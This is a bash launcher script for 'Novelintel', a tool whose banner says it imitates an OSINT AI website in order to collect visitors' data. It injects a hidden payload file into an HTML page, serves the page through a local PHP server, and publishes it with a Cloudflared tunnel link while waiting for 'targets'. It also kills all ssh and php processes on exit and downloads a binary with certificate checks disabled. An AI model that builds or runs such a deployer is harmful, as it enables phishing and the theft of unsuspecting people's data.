#!/bin/bash
# Novelintel ver 1.2

set -u
set -o pipefail

banner() {
  clear
  local text="
             ____  _____ _____   _____________                                    
            / __ \/ ___//  _/ | / /_  __/ ___/_______________ ____  ___  _____    
           / / / /\__ \ / //  |/ / / /  \__ \/ ___/ ___/ __  / __ \/ _ \/ ___/    
          / /_/ /___/ // // /|  / / /  ___/ / /__/ /  / /_/ / /_/ /  __/ /        
          \____//____/___/_/ |_/ /_/  /____/\___/_/   \__,_/ .___/\___/_/         
                                                          /_/                     

    OSINTScraper mimics a OSINT AI website that leverages the bot to collect user data
                       Part of Novelintel by Novelintel Investigations 
"
  for ((i=0; i<${#text}; i++)); do
    printf "%c" "${text:i:1}"
    sleep 0.001
  done
  printf "\n"
}


dependencies() {
    for dep in php curl wget; do
        if ! command -v "$dep" >/dev/null 2>&1; then
            echo "Error: $dep is not installed. Please install it and try again."
            exit 1
        fi
    done
}

stop() {
    pkill -f cloudflared >/dev/null 2>&1 || true
    pkill -f php >/dev/null 2>&1 || true
    pkill -f ssh >/dev/null 2>&1 || true
    exit 1
}

trap 'printf "\n"; stop' INT

checkfound() {
    printf "\n\e[38;2;255;255;255m\e[1m[*] Waiting targets, copy by selecting text with the left mouse button\nand paste it with the middle mouse button.\nPress Ctrl + C to exit...\e[0m\n"
    while true; do
        sleep 0.5
    done
}

cf_server() {
    SCRIPT_DIR="$(dirname "$(readlink -f "$0")")"
    LOG_FILE="$SCRIPT_DIR/cf.log"

    if [[ -e cloudflared ]]; then
        echo "Cloudflared already installed."
    else
        printf "\e[38;2;255;255;255m\e[1m[+] Downloading Cloudflared for Debian (amd64)...\e[0m\n"
        if ! wget --no-check-certificate \
            https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 \
            -O cloudflared; then
            echo "[!] Failed to download cloudflared. Check your internet connection or GitHub availability."
            exit 1
        fi
    fi

    chmod +x cloudflared
    printf "\e[38;2;255;255;255m\e[1m[+] Starting PHP server on 127.0.0.1:3333...\e[0m\n"
    php -S 127.0.0.1:3333 >/dev/null 2>&1 &
    sleep 2

    if ! curl -s http://127.0.0.1:3333 >/dev/null; then
        printf "\e[38;2;255;0;0m\e[1m[!] PHP server is not responding on port 3333. Check your index.php or service.\e[0m\n"
        exit 1
    fi

    printf "\e[38;2;255;255;255m\e[1m[+] Starting Cloudflared tunnel...\e[0m\n"
    rm -f "$LOG_FILE"
    ./cloudflared tunnel --url http://127.0.0.1:3333 --logfile "$LOG_FILE" >/dev/null 2>&1 &
    sleep 10

    link=$(grep -m 1 -o 'https://[-a-zA-Z0-9.]*\.trycloudflare.com' "$LOG_FILE")
    if [[ -z "$link" ]]; then
        printf "\e[38;2;255;0;0m\e[1m[!] Direct link is not generating\e[0m\n"
        exit 1
    else
        printf "\e[38;2;255;255;255m\e[1m[*] Direct link:\e[0m\e[38;2;255;255;255m %s\e[0m\n" "$link"
    fi

    sed "s+forwarding_link+$link+g" template.php > index.php
    checkfound
}

Novelintel() {
    SCRIPT_DIR="$(dirname "$(readlink -f "$0")")"
    sed -e '/tc_payload/r payload' OSINTScrape.html > OSINTScraper.html
    cf_server
}

banner
dependencies
Novelintel

